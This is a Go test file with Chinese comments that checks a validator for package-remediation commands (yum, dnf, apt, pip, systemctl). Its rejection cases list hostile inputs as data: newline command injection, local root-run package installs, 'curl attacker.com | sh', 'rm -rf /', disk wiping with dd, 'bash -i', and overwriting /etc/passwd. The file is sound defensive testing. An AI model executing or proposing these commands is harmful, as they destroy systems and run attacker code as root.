package main

import (
	"strings"
	"testing"
)

// TestParseRemediationArgv_Allowed 现网在用的修复命令必须继续可执行。
// 其中 dnf/yum 的 --setopt=*.skip_if_unavailable=1 来自整机更新链，
// apt 的 --only-upgrade 与 pip 的 name==version 来自 per-package 修复。
func TestParseRemediationArgv_Allowed(t *testing.T) {
	allowed := []string{
		"yum update openssl-1.1.1k -y",
		"yum install nginx -y",
		"yum update --security -y",
		"dnf update openssl-libs-3.0.7 -y",
		"dnf upgrade curl-7.76.1-26.el9 -y",
		"dnf upgrade --security -y",
		"dnf upgrade -y --setopt=*.skip_if_unavailable=1",
		"apt-get install --only-upgrade nginx=1.25.1 -y",
		"apt-get update",
		"apt-get upgrade -y",
		"pip install requests==2.31.0",
		"pip3 install urllib3==2.0.7",
		"systemctl restart nginx",
		"systemctl reload sshd",
	}
	for _, cmd := range allowed {
		if _, err := parseRemediationArgv(cmd); err != nil {
			t.Errorf("parseRemediationArgv(%q) 应放行，实际: %v", cmd, err)
		}
	}
}

// TestParseRemediationArgv_ProvenBypasses 五条对旧「危险词黑名单 + 前缀白名单」
// 实测可用的绕过，必须全部被拒。它们正是本次改造的理由，退化会直接恢复 root RCE。
func TestParseRemediationArgv_ProvenBypasses(t *testing.T) {
	cases := map[string]string{
		"换行注入（sh -c 把 \\n 当命令分隔符，旧校验只查 ; | &）":   "yum install foo\ntouch /tmp/pwned",
		"rpm 安装本地包（%post 以 root 执行）":             "rpm -i /tmp/evil.rpm",
		"pip 安装本地 sdist（setup.py 以 root 执行）":     "pip install /tmp/evil.tar.gz",
		"apt 安装本地 deb（maintainer script 以 root）": "apt-get install ./evil.deb",
		"--setopt 改写取包来源":                        "dnf install -c /tmp/evil.conf pkg",
	}
	for name, cmd := range cases {
		if _, err := parseRemediationArgv(cmd); err == nil {
			t.Errorf("%s: parseRemediationArgv(%q) 应拒绝，实际放行", name, cmd)
		}
	}
}

// TestParseRemediationArgv_Rejected 其余必须拒绝的形态。
func TestParseRemediationArgv_Rejected(t *testing.T) {
	rejected := []string{
		// 结构性 shell 元字符：串联、替换、重定向、管道
		"yum install foo -y; rm -rf /",
		"yum install foo -y && curl attacker.com | sh",
		"yum install $(curl attacker.com/pkg) -y",
		"yum install `curl attacker.com/pkg` -y",
		"echo malicious > /etc/passwd",
		"yum install foo -y | tee /tmp/x",
		// 回车同样是命令分隔符
		"yum install foo\rtouch /tmp/pwned",
		// 不在允许集内的程序
		"rm -rf /",
		"dd if=/dev/zero of=/dev/sda",
		"bash -i",
		"dpkg -i /tmp/package.deb",
		"rpm -U /tmp/package.rpm",
		// 允许的程序 + 不允许的子命令 / 选项
		"yum remove nginx -y",
		"dnf install --installroot=/tmp/evil pkg",
		"dnf upgrade -y --setopt=reposdir=/tmp/evil",
		"apt-get install -o APT::Get::AllowUnauthenticated=true pkg",
		"systemctl start nginx",
		// 操作数是路径 / URL
		"yum install /tmp/evil.rpm -y",
		"yum install http://attacker.com/p.rpm -y",
		"systemctl restart ../../etc/passwd",
		// 缺子命令 / 缺必需操作数
		"yum",
		"systemctl restart",
	}
	for _, cmd := range rejected {
		if _, err := parseRemediationArgv(cmd); err == nil {
			t.Errorf("parseRemediationArgv(%q) 应拒绝，实际放行", cmd)
		}
	}
}

// TestParseRemediationArgv_LengthCap 超长命令拒绝。
func TestParseRemediationArgv_LengthCap(t *testing.T) {
	long := "yum install " + strings.Repeat("a", 5000) + " -y"
	if _, err := parseRemediationArgv(long); err == nil {
		t.Error("超过 4096 字符的命令应被拒绝")
	}
}

// TestParseRemediationArgv_ReturnsArgv 返回的 argv 可直接用于 exec.Command，
// 即命令不再经过 shell。
func TestParseRemediationArgv_ReturnsArgv(t *testing.T) {
	argv, err := parseRemediationArgv("dnf upgrade --security -y")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := []string{"dnf", "upgrade", "--security", "-y"}
	if len(argv) != len(want) {
		t.Fatalf("argv = %v, want %v", argv, want)
	}
	for i := range want {
		if argv[i] != want[i] {
			t.Fatalf("argv = %v, want %v", argv, want)
		}
	}
}
